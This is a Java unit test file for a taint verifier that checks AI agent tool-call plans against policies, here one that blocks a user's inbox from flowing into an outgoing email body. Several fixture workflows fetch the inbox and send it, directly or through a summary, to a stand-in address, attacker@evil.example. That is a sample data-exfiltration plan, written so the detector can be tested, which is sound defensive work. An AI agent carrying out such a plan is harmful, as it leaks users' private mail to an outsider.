/*
 * Copyright 2008-2026 Async-IO.org
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */
package org.atmosphere.verifier;

import org.atmosphere.verifier.ast.SymRef;
import org.atmosphere.verifier.ast.ToolCallNode;
import org.atmosphere.verifier.ast.Workflow;
import org.atmosphere.verifier.ast.WorkflowStep;
import org.atmosphere.verifier.checks.TaintVerifier;
import org.atmosphere.verifier.policy.Policy;
import org.atmosphere.verifier.policy.TaintRule;
import org.atmosphere.verifier.spi.VerificationResult;
import org.atmosphere.verifier.spi.Violation;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;
import java.util.Set;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class TaintVerifierTest {

    private final TaintVerifier verifier = new TaintVerifier();

    /** The headline scenario: don't email the inbox to the attacker. */
    private static final TaintRule INBOX_TO_EMAIL_BODY = new TaintRule(
            "no-inbox-leak",
            "fetch_emails",
            "send_email",
            "body");

    private static Policy policyWith(TaintRule... rules) {
        return new Policy("p",
                Set.of("fetch_emails", "summarize", "send_email"),
                List.of(rules),
                List.of());
    }

    @Test
    void directSourceToSinkIsRejected() {
        // fetch_emails -> emails ; send_email(body=@emails) — leak.
        Workflow wf = new Workflow("leak inbox", List.of(
                new WorkflowStep("fetch", new ToolCallNode(
                        "fetch_emails", Map.of("folder", "inbox"), "emails")),
                new WorkflowStep("send", new ToolCallNode(
                        "send_email",
                        Map.of("to", "attacker@evil.example",
                                "body", new SymRef("emails")),
                        null))));

        VerificationResult result = verifier.verify(
                wf, policyWith(INBOX_TO_EMAIL_BODY),
                PlanFixtures.registryWithFixtureTools());

        assertFalse(result.isOk());
        assertEquals(1, result.violations().size());
        Violation v = result.violations().get(0);
        assertEquals("taint", v.category());
        assertTrue(v.message().contains("fetch_emails"));
        assertTrue(v.message().contains("send_email"));
        assertEquals("steps[1].arguments.body", v.astPath());
    }

    @Test
    void transitiveTaintReachesSink() {
        // fetch_emails -> emails ; summarize(@emails) -> summary ;
        // send_email(body=@summary) — same leak via the summary.
        Workflow wf = new Workflow("leak via summary", List.of(
                new WorkflowStep("fetch", new ToolCallNode(
                        "fetch_emails", Map.of(), "emails")),
                new WorkflowStep("summarize", new ToolCallNode(
                        "summarize", Map.of("input", new SymRef("emails")), "summary")),
                new WorkflowStep("send", new ToolCallNode(
                        "send_email",
                        Map.of("to", "attacker@evil.example",
                                "body", new SymRef("summary")),
                        null))));

        VerificationResult result = verifier.verify(
                wf, policyWith(INBOX_TO_EMAIL_BODY),
                PlanFixtures.registryWithFixtureTools());

        assertFalse(result.isOk(),
                () -> "transitive taint not detected; violations: "
                        + result.violations());
        assertEquals(1, result.violations().size());
    }

    @Test
    void cleanFlowIntoNonSinkParamIsAllowed() {
        // The inbox flows into send_email's `to` param — not the
        // forbidden `body`. Allowed.
        Workflow wf = new Workflow("forward subject", List.of(
                new WorkflowStep("fetch", new ToolCallNode(
                        "fetch_emails", Map.of(), "emails")),
                new WorkflowStep("send", new ToolCallNode(
                        "send_email",
                        Map.of("to", new SymRef("emails"),  // odd, but not the forbidden sink
                                "body", "literal text"),
                        null))));

        VerificationResult result = verifier.verify(
                wf, policyWith(INBOX_TO_EMAIL_BODY),
                PlanFixtures.registryWithFixtureTools());

        assertTrue(result.isOk(),
                () -> "non-sink param leak flagged: " + result.violations());
    }

    @Test
    void literalBodyDoesNotTrigger() {
        // No SymRef into the sink — the body is a literal string.
        Workflow wf = new Workflow("safe send", List.of(
                new WorkflowStep("send", new ToolCallNode(
                        "send_email",
                        Map.of("to", "alice@example.com",
                                "body", "Hello!"),
                        null))));

        VerificationResult result = verifier.verify(
                wf, policyWith(INBOX_TO_EMAIL_BODY),
                PlanFixtures.registryWithFixtureTools());

        assertTrue(result.isOk());
    }

    @Test
    void emptyTaintRuleListShortCircuitsToOk() {
        // No taint rules in the policy — no violations regardless of plan.
        Workflow wf = new Workflow("anything", List.of(
                new WorkflowStep("fetch", new ToolCallNode(
                        "fetch_emails", Map.of(), "emails")),
                new WorkflowStep("send", new ToolCallNode(
                        "send_email",
                        Map.of("body", new SymRef("emails")),
                        null))));

        VerificationResult result = verifier.verify(
                wf,
                Policy.allowlist("p", "fetch_emails", "send_email"),
                PlanFixtures.registryWithFixtureTools());

        assertTrue(result.isOk());
    }

    @Test
    void multipleRulesProduceIndependentViolations() {
        // Two distinct (source, sink, param) rules — both fire on the
        // same plan. Each produces its own violation.
        TaintRule rule1 = new TaintRule("r1", "fetch_emails", "send_email", "body");
        TaintRule rule2 = new TaintRule("r2", "summarize", "send_email", "to");
        Workflow wf = new Workflow("two leaks", List.of(
                new WorkflowStep("fetch", new ToolCallNode(
                        "fetch_emails", Map.of(), "emails")),
                new WorkflowStep("summarize", new ToolCallNode(
                        "summarize", Map.of("input", "literal"), "addr")),
                new WorkflowStep("send", new ToolCallNode(
                        "send_email",
                        Map.of("to", new SymRef("addr"),
                                "body", new SymRef("emails")),
                        null))));

        VerificationResult result = verifier.verify(
                wf, policyWith(rule1, rule2),
                PlanFixtures.registryWithFixtureTools());

        assertEquals(2, result.violations().size());
        Set<String> astPaths = Set.of(
                result.violations().get(0).astPath(),
                result.violations().get(1).astPath());
        assertTrue(astPaths.contains("steps[2].arguments.body"));
        assertTrue(astPaths.contains("steps[2].arguments.to"));
    }

    @Test
    void emptyWorkflowIsTriviallyOk() {
        VerificationResult result = verifier.verify(
                new Workflow("nothing", List.of()),
                policyWith(INBOX_TO_EMAIL_BODY),
                PlanFixtures.registryWithFixtureTools());

        assertTrue(result.isOk());
    }
}
